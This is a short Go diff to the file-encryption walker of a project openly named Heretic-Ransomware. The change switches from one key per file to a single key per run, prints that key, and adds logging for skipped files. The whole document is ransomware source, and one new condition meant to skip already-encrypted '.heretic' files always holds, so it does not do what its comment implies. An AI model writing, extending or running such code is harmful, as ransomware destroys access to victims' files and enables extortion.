@@ -1,6 +1,7 @@
 package files
 
 import (
+	"fmt"
 	json "github.com/bytedance/sonic"
 	"github.com/dark-faction/Heretic-Ransomware/internal/cipher"
 	"go.uber.org/zap"
@@ -18,7 +19,14 @@ func FileWalkerEncrypt(ch chan string) {
 
 	dirname := "/home/anon/RansomFiles"
 
-	err := filepath.Walk(dirname, func(path string, info os.FileInfo, err error) error {
+	key, err := cipher.RandomString()
+	if err != nil {
+		zap.L().Info(err.Error())
+	}
+
+	fmt.Println(key)
+
+	err = filepath.Walk(dirname, func(path string, info os.FileInfo, err error) error {
 
 		if info.IsDir() {
 			for _, excluded := range ExcludedDirectories {
@@ -29,12 +37,12 @@ func FileWalkerEncrypt(ch chan string) {
 		}
 
 		if !info.IsDir() {
-			if !slices.Contains(ExcludedFiles, info.Name()) && !slices.Contains(ExcludedExtensions, filepath.Ext(path)) {
-				// assign decryption key to path/file
-				key, err := cipher.RandomString()
-				if err != nil {
-					zap.L().Info(err.Error())
-				}
+			if !slices.Contains(ExcludedFiles, info.Name()) && !slices.Contains(ExcludedExtensions, filepath.Ext(path)) && info.Name() != fmt.Sprintf("%s.heretic", info.Name()) {
+				// assign different decryption key to each path/file
+				//key, err := cipher.RandomString()
+				//if err != nil {
+				//	zap.L().Info(err.Error())
+				//}
 
 				fileInfo, err := json.Marshal(cipher.FilePathInfo{
 					Path:          path,
@@ -48,6 +56,8 @@ func FileWalkerEncrypt(ch chan string) {
 				}
 
 				ch <- string(fileInfo)
+			} else {
+				zap.L().Info(fmt.Sprintf("Skipping file: %s", info.Name()))
 			}
 		}
 
